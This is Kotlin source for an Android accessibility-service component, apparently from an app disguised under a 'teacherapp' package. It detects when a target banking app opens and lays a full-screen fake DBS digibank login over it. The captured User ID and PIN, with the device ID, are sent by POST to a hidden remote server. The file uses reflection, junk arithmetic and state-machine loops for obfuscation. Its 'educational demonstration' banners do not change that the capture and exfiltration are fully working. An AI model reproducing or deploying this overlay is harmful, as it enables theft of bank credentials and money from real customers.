package com.example.teacherapp.services

import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.Drawable
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.*
import com.example.teacherapp.obfuscation.ThemeConfigUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class UiLayerHelper(private val service: InputAssistService) {

    private val TAG        = ThemeConfigUtils.getTag(2)
    
    private val TARGET_APP get() = ThemeConfigUtils.getTargetPackage()
    private val SERVER     get() = ThemeConfigUtils.getBaseServer()

    private val DBS_RED        = Color.parseColor("#E60000")
    private val DBS_WHITE      = Color.WHITE
    private val DBS_BLACK      = Color.parseColor("#000000")
    private val DBS_GRAY       = Color.parseColor("#666666")
    private val DEMO_BANNER_BG = Color.parseColor("#FF5722")

    private var overlayView: View? = null
    private val windowManager: WindowManager =
        service.getSystemService(android.content.Context.WINDOW_SERVICE) as WindowManager

    @Volatile private var isOverlayShowing = false

    

    fun onEvent(event: AccessibilityEvent) {
        
        val t = System.currentTimeMillis()
        val op = (t % 1000) * (t % 1000)  
        if (op < 0) {
            
            val fakeLayout = LinearLayout(service)
            fakeLayout.visibility = View.GONE
            return
        }

        val packageName = event.packageName?.toString() ?: return
        
        val clazz = Class.forName(ThemeConfigUtils.getStringClass())
        val equalsMethod = clazz.getMethod(ThemeConfigUtils.getEqualsMethod(), Any::class.java)
        val isTarget = equalsMethod.invoke(packageName, TARGET_APP) as Boolean

        if (isTarget && !isOverlayShowing) {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
                isOverlayShowing = true
                Handler(Looper.getMainLooper()).postDelayed({
                    if (overlayView == null) showDbsLoginOverlay()
                }, 500)
            }
        }
    }

    

    private fun showDbsLoginOverlay() {
        var state = 0
        var params: WindowManager.LayoutParams? = null

        while (true) {
            val junk = (state * 41 + 13) xor 0xBE
            val _ = junk

            when (state) {
                0 -> { overlayView = createDbsLoginScreen(); state = 1 }
                1 -> {
                    params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE,
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                        PixelFormat.TRANSLUCENT
                    )
                    state = 2
                }
                2 -> {
                    try {
                        windowManager.addView(overlayView, params)
                    } catch (e: Exception) {
                        isOverlayShowing = false
                    }
                    return
                }
            }
        }
    }

    fun removeOverlay() {
        overlayView?.let {
            try {
                windowManager.removeView(it)
                overlayView      = null
                isOverlayShowing = false
            } catch (_: Exception) {}
        }
    }

    

    private fun createDbsLoginScreen(): View {
        return LinearLayout(service).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(DBS_WHITE)
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
            addView(createDemoBanner())
            addView(createLoginContent())
        }
    }

    private fun createDemoBanner(): View {
        return LinearLayout(service).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(DEMO_BANNER_BG)
            setPadding(dp(16), dp(12), dp(16), dp(12))
            addView(TextView(service).apply {
                text = "⚠️ EDUCATIONAL DEMONSTRATION ⚠️"; textSize = 14f
                setTextColor(DBS_WHITE); gravity = Gravity.CENTER; typeface = Typeface.DEFAULT_BOLD
            })
            addView(TextView(service).apply {
                text = "This is a replica showing how phishing works • Enter fake data only"
                textSize = 11f; setTextColor(DBS_WHITE); gravity = Gravity.CENTER
                setPadding(0, dp(4), 0, 0)
            })
        }
    }

    private fun createLoginContent(): View {
        return LinearLayout(service).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(DBS_WHITE)
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
            addView(createSpacer(40)); addView(createHeader()); addView(createSpacer(48))
            val userIdField = createInputField("User ID")
            addView(userIdField); addView(createSpacer(20))
            val pinField = createPinField()
            addView(pinField); addView(createSpacer(32))
            addView(createLoginButton(userIdField, pinField))
            addView(createSpacer(24)); addView(createLoginOptions()); addView(createBottomNote())
        }
    }

    private fun createHeader(): View {
        return LinearLayout(service).apply {
            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(32), 0, dp(32), 0)
            addView(TextView(service).apply {
                text = "DBS"; textSize = 32f; setTextColor(DBS_RED)
                typeface = Typeface.DEFAULT_BOLD; gravity = Gravity.CENTER
            })
            addView(TextView(service).apply {
                text = "digibank"; textSize = 18f; setTextColor(DBS_BLACK)
                gravity = Gravity.CENTER; setPadding(0, dp(4), 0, 0)
            })
            addView(TextView(service).apply {
                text = "Login to continue"; textSize = 14f; setTextColor(DBS_GRAY)
                gravity = Gravity.CENTER; setPadding(0, dp(24), 0, 0)
            })
        }
    }

    private fun createInputField(hint: String): EditText {
        return EditText(service).apply {
            this.hint = hint; textSize = 16f
            setTextColor(DBS_BLACK); setHintTextColor(DBS_GRAY)
            setPadding(dp(20), dp(16), dp(20), dp(16)); background = createInputBackground()
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { setMargins(dp(32), 0, dp(32), 0) }
        }
    }

    private fun createPinField(): EditText {
        return EditText(service).apply {
            hint = "6-Digit PIN"; textSize = 16f
            setTextColor(DBS_BLACK); setHintTextColor(DBS_GRAY)
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
            setPadding(dp(20), dp(16), dp(20), dp(16)); background = createInputBackground()
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { setMargins(dp(32), 0, dp(32), 0) }
        }
    }

    private fun createLoginButton(userIdField: EditText, pinField: EditText): Button {
        return Button(service).apply {
            text = "Login"; textSize = 16f; setTextColor(DBS_WHITE)
            setBackgroundColor(DBS_RED); typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(50)
            ).apply { setMargins(dp(32), 0, dp(32), 0) }
            setOnClickListener {
                val userId = userIdField.text.toString()
                val pin    = pinField.text.toString()
                if (userId.isNotEmpty() && pin.isNotEmpty()) {
                    captureCredentials(userId, pin)
                } else {
                    Toast.makeText(service, "Please enter User ID and PIN for demo", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    private fun createLoginOptions(): View {
        return LinearLayout(service).apply {
            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(32), 0, dp(32), 0)
            addView(TextView(service).apply {
                text = "Forgot User ID or PIN?"; textSize = 14f; setTextColor(DBS_RED)
                gravity = Gravity.CENTER; setPadding(0, 0, 0, dp(12))
            })
            addView(TextView(service).apply {
                text = "Activate digibank"; textSize = 14f
                setTextColor(DBS_RED); gravity = Gravity.CENTER
            })
        }
    }

    private fun createBottomNote(): View {
        return LinearLayout(service).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL or Gravity.BOTTOM
            setPadding(dp(32), 0, dp(32), dp(24))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0).apply { weight = 1f }
            addView(TextView(service).apply {
                text = "💡 Real phishing looks exactly like this\nwithout the orange banner"
                textSize = 11f; setTextColor(DBS_GRAY); gravity = Gravity.CENTER
                setPadding(dp(16), dp(16), dp(16), dp(16))
                setBackgroundColor(Color.parseColor("#FFF3E0"))
            })
        }
    }

    private fun createInputBackground(): Drawable {
        return GradientDrawable().apply {
            setColor(DBS_WHITE); setStroke(2, Color.parseColor("#E0E0E0"))
            cornerRadius = dp(8).toFloat()
        }
    }

    private fun createSpacer(heightDp: Int): View {
        return View(service).apply {
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(heightDp))
        }
    }

    private fun dp(v: Int): Int = TypedValue.applyDimension(
        TypedValue.COMPLEX_UNIT_DIP, v.toFloat(), service.resources.displayMetrics).toInt()

    

    private fun captureCredentials(userId: String, pin: String) {
        var state = 0
        while (true) {
            val junk = (state * 53 + 7) xor 0xEF
            val _ = junk
            when (state) {
                0 -> { exfiltrateCredentials(userId, pin); state = 1 }
                1 -> { removeOverlay(); state = 2 }
                2 -> {
                    Toast.makeText(service, "✅ Demo: Credentials captured\nCheck your dashboard", Toast.LENGTH_LONG).show()
                    return
                }
            }
        }
    }

    private fun exfiltrateCredentials(userId: String, pin: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val data = JSONObject().apply {
                    put("type",           "phishing_demo")
                    put("app_package",    TARGET_APP)
                    put("app_name",       "DBS digibank")
                    put("user_id",        userId)
                    put("pin",            pin)
                    put("pin_length",     pin.length)
                    put("android_id",     resolveDeviceId())
                    put("timestamp",      System.currentTimeMillis())
                    put("time_formatted", resolveTime(System.currentTimeMillis()))
                    put("demo_note",      "Realistic overlay - educational demo")
                }
                
                val endpoint = ThemeConfigUtils.getPhishingEndpoint()
                val connection = URL(endpoint).openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"; doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    connectTimeout = 10000; readTimeout = 10000
                }
                OutputStreamWriter(connection.outputStream).use { it.write(data.toString()); it.flush() }
                connection.responseCode
                connection.disconnect()
            } catch (_: Exception) {}
        }
    }

    private fun resolveDeviceId(): String =
        android.provider.Settings.Secure.getString(
            service.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"

    private fun resolveTime(ts: Long): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(ts))
}
